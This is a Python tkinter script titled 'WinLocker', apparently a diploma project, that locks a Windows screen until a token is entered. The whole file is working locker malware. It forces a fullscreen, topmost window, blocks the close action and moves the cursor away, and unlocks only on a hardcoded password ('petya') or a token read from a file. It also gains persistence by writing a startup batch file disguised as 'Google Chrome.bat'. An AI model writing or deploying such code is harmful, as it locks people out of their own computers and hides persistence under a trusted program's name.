from playsound import *
import tkinter
from tkinter import *
import tkinter as tk
from tkinter import ttk
import getpass
import sys
import os
import os.path
import pyautogui
import time
import io
import chardet
import os
import codecs

#txt file
USER_NAME = getpass.getuser()
filename = "D:\work\diplom\Token.txt"
bytes = min(32, os.path.getsize(filename))
text = open(filename,"rb").read(bytes)
if text.startswith(codecs.BOM_UTF8):
    encoding = "utf-8-sig"
else:
    result = chardet.detect(text)
    encoding = result["encoding"]
infile = io.open(filename, "r", encoding=encoding)
data = infile.readline(10)
infile.close()
print(data)

USER_NAME = getpass.getuser()
filename = "D:\work\diplom\Time.txt"
bytes = min(32, os.path.getsize(filename))
text = open(filename,"rb").read(bytes)
if text.startswith(codecs.BOM_UTF8):
    encoding = "utf-8-sig"
else:
    result = chardet.detect(text)
    encoding = result["encoding"]
infile = io.open(filename, "r", encoding=encoding)
time = infile.readline(2)
time = int(time)
infile.close()
print(time)

#txt file end


window = Tk()
window.title("WinLocker")  
window.geometry('1920x1080')
window['bg'] = 'white'

# Base size
normal_width = 1920 # Setting the regular monitor width  
normal_height = 1080 # Setting the regular monitor height

# Get screen size
screen_width = window.winfo_screenwidth()
screen_height = window.winfo_screenheight()

# Get percentage of screen size from Base size
percentage_width = screen_width / (normal_width / 100)
percentage_height = screen_height / (normal_height / 100)

# Make a scaling factor, this is bases on average percentage from width and height.
scale_factor = ((percentage_width + percentage_height) / 2) / 100

# Set the fontsize based on scale_factor,
# if the fontsize is less than minimum_size
# it is set to the minimum size

fontsize = int(20 * scale_factor)
minimum_size = 10
if fontsize < minimum_size:
       fontsize = minimum_size

fontsizeHding = int(72 * scale_factor)
minimum_size = 40
if fontsizeHding < minimum_size:
       fontsizeHding = minimum_size

# Create a style and configure for ttk.Button widget
default_style = ttk.Style()
default_style.configure('New.TButton', font=("Helvetica", fontsize))

# Autorun
def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "Google Chrome.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)
# No Alt + F4
def block():
    pyautogui.moveTo(x=680,y=800)
    window.protocol("WM_DELETE_WINDOW",block)
    window.update()
# Always main screen
def fullscreen():
    window.attributes('-fullscreen', True, '-topmost', True)
# Password
def clicked():
    res = format(txt.get())
    if res == 'petya' or res == data:
        file_path = '/tmp/file.txt'
        file_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Google Chrome.bat' % USER_NAME
        os.remove(file_path)
        sys.exit()

add_to_startup("D:\\work\\diplom\\AppFin\\AppFin\\AppFin.py")
fullscreen()

txt_one = Label(window, text='WinLocker', font=("Arial Bold", fontsizeHding), fg='purple', bg='white')
txt_two = Label(window, text='PC control system', font=("Arial Bold", fontsizeHding), fg='purple', bg='white')
txt_three = Label(window, text='Enter the token to gain access to the computer', font=("Arial Bold", fontsize), fg='purple', bg='white')

txt_one.grid(column=0, row=0)
txt_two.grid(column=0, row=0)
txt_three.grid(column=0, row=0)

txt_one.place(relx = .01, rely = .01)
txt_two.place(relx = .01, rely = .11)
txt_three.place(relx = .01, rely = .21)


txt = Entry(window)  
btn = Button(window, text="ENTER", command=clicked)  
txt.place(relx = .28, rely = .5, relwidth=.3, relheight=.06)
btn.place(relx = .62, rely = .5, relwidth=.1, relheight=.06)

block()

window.mainloop()


